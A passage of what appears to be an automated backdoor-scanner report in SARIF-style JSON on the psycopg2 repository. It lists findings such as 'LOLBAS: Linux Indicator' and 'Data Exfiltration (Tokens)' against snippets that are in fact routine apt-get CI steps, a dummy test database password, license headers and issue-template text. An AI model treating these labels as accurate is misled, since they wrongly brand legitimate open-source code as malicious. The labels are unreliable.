                      "markdown": "`      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 172.17.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n      PSYCOPG2_TEST_FAST: 1\n\n    services:\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 26,
                  "endLine": 65,
                  "snippet": {
                    "text": "          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n",
                    "rendered": {
                      "text": "          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n",
                      "markdown": "`          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 12,
                  "endLine": 70,
                  "endColumn": 17,
                  "snippet": {
                    "text": "          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n        run: pip install \"tox < 4\"\n      - uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python }}\n",
                    "rendered": {
                      "text": "          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n        run: pip install \"tox < 4\"\n      - uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python }}\n",
                      "markdown": "`          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n        run: pip install \"tox < 4\"\n      - uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python }}\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 14,
                  "endLine": 67,
                  "endColumn": 23,
                  "snippet": {
                    "text": "          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n        run: pip install \"tox < 4\"\n",
                    "rendered": {
                      "text": "          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n        run: pip install \"tox < 4\"\n",
                      "markdown": "`          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n        run: pip install \"tox < 4\"\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 13,
                  "endLine": 66,
                  "endColumn": 18,
                  "snippet": {
                    "text": "            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n",
                    "rendered": {
                      "text": "            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n",
                      "markdown": "`            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n      - name: Install tox\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 59,
                  "endLine": 65,
                  "endColumn": 65,
                  "snippet": {
                    "text": "          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n",
                    "rendered": {
                      "text": "          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n",
                      "markdown": "`          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 42,
                  "endLine": 65,
                  "endColumn": 48,
                  "snippet": {
                    "text": "          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n",
                    "rendered": {
                      "text": "          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n",
                      "markdown": "`          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 14,
                  "endLine": 64,
                  "endColumn": 23,
                  "snippet": {
                    "text": "          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n",
                    "rendered": {
                      "text": "          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n",
                      "markdown": "`          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n          sudo apt-get -qq -y install \"libpq-dev=${pqver}\" \"libpq5=${pqver}\"\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 18,
                  "endLine": 63,
                  "endColumn": 23,
                  "snippet": {
                    "text": "          set -x\n          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n",
                    "rendered": {
                      "text": "          set -x\n          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n",
                      "markdown": "`          set -x\n          rel=$(lsb_release -c -s)\n          echo \"deb http://apt.postgresql.org/pub/repos/apt ${rel}-pgdg main 16\" \\\n            | sudo tee -a /etc/apt/sources.list.d/pgdg.list\n          sudo apt-get -qq update\n          pqver=$(apt-cache show libpq5  | grep ^Version: | head -1 \\\n            | awk '{print $2}')\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 29,
                  "endLine": 43,
                  "endColumn": 37,
                  "snippet": {
                    "text": "      postgresql:\n        image: postgres:${{ matrix.postgres }}\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                    "rendered": {
                      "text": "      postgresql:\n        image: postgres:${{ matrix.postgres }}\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                      "markdown": "`      postgresql:\n        image: postgres:${{ matrix.postgres }}\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 19,
                  "endLine": 43,
                  "endColumn": 27,
                  "snippet": {
                    "text": "      postgresql:\n        image: postgres:${{ matrix.postgres }}\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                    "rendered": {
                      "text": "      postgresql:\n        image: postgres:${{ matrix.postgres }}\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n",
                      "markdown": "`      postgresql:\n        image: postgres:${{ matrix.postgres }}\n        env:\n          POSTGRES_PASSWORD: password\n        ports:\n          - 5432:5432\n        # Set health checks to wait until postgres has started\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 32,
                  "endLine": 37,
                  "endColumn": 40,
                  "snippet": {
                    "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 127.0.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n\n    services:\n      postgresql:\n",
                    "rendered": {
                      "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 127.0.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n\n    services:\n      postgresql:\n",
                      "markdown": "`      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 127.0.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n\n    services:\n      postgresql:\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/workflows/tests.yml"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 22,
                  "endLine": 37,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 127.0.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n\n    services:\n      postgresql:\n",
                    "rendered": {
                      "text": "      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 127.0.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n\n    services:\n      postgresql:\n",
                      "markdown": "`      PSYCOPG2_TESTDB: postgres\n      PSYCOPG2_TESTDB_HOST: 127.0.0.1\n      PSYCOPG2_TESTDB_USER: postgres\n      PSYCOPG2_TESTDB_PASSWORD: password\n\n    services:\n      postgresql:\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/ISSUE_TEMPLATE/problem-using-psycopg2.md"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 22,
                  "endLine": 27,
                  "endColumn": 30,
                  "snippet": {
                    "text": "2: what you expected to happen\n3: what happened instead\n\nIf possible, provide a script reproducing the issue.\n",
                    "rendered": {
                      "text": "2: what you expected to happen\n3: what happened instead\n\nIf possible, provide a script reproducing the issue.\n",
                      "markdown": "`2: what you expected to happen\n3: what happened instead\n\nIf possible, provide a script reproducing the issue.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/ISSUE_TEMPLATE/problem-using-psycopg2.md"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 1,
                  "endLine": 18,
                  "endColumn": 6,
                  "snippet": {
                    "text": "- Psycopg version:\n- Python version:\n- PostgreSQL version:\n- pip version\n\n**Describe the bug**\nPlease let us know:\n",
                    "rendered": {
                      "text": "- Psycopg version:\n- Python version:\n- PostgreSQL version:\n- pip version\n\n**Describe the bug**\nPlease let us know:\n",
                      "markdown": "`- Psycopg version:\n- Python version:\n- PostgreSQL version:\n- pip version\n\n**Describe the bug**\nPlease let us know:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.github/ISSUE_TEMPLATE/problem-installing-psycopg2.md"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 1,
                  "endLine": 23,
                  "endColumn": 6,
                  "snippet": {
                    "text": "- Psycopg version:\n- Python version:\n- PostgreSQL version:\n- pip version\n",
                    "rendered": {
                      "text": "- Psycopg version:\n- Python version:\n- PostgreSQL version:\n- pip version\n",
                      "markdown": "`- Psycopg version:\n- Python version:\n- PostgreSQL version:\n- pip version\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.git/info/exclude"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 1,
                  "endLine": 1,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                    "rendered": {
                      "text": "# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n",
                      "markdown": "`# git ls-files --others --exclude-from=.git/info/exclude\n# Lines that start with '#' are comments.\n# For a project mostly in C, the following would be a good set of\n# exclude patterns (uncomment them if you want to use them):\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_bugX000.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 6,
                  "endLine": 28,
                  "snippet": {
                    "text": "# License for more details.\n\nimport psycopg2\nimport time\nimport unittest\n\n\nclass DateTimeAllocationBugTestCase(unittest.TestCase):\n",
                    "rendered": {
                      "text": "# License for more details.\n\nimport psycopg2\nimport time\nimport unittest\n\n\nclass DateTimeAllocationBugTestCase(unittest.TestCase):\n",
                      "markdown": "`# License for more details.\n\nimport psycopg2\nimport time\nimport unittest\n\n\nclass DateTimeAllocationBugTestCase(unittest.TestCase):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_bugX000.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_bugX000.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_green.py"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 55,
                  "endLine": 170,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        psycopg2.extensions.set_wait_callback(self._cb)\n\n    def crappy_callback(self, conn):\n        \"\"\"green callback failing after `self.to_error` time it is called\"\"\"\n        while True:\n            if self.to_error is not None:\n                self.to_error -= 1\n",
                    "rendered": {
                      "text": "        psycopg2.extensions.set_wait_callback(self._cb)\n\n    def crappy_callback(self, conn):\n        \"\"\"green callback failing after `self.to_error` time it is called\"\"\"\n        while True:\n            if self.to_error is not None:\n                self.to_error -= 1\n",
                      "markdown": "`        psycopg2.extensions.set_wait_callback(self._cb)\n\n    def crappy_callback(self, conn):\n        \"\"\"green callback failing after `self.to_error` time it is called\"\"\"\n        while True:\n            if self.to_error is not None:\n                self.to_error -= 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_green.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_green.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
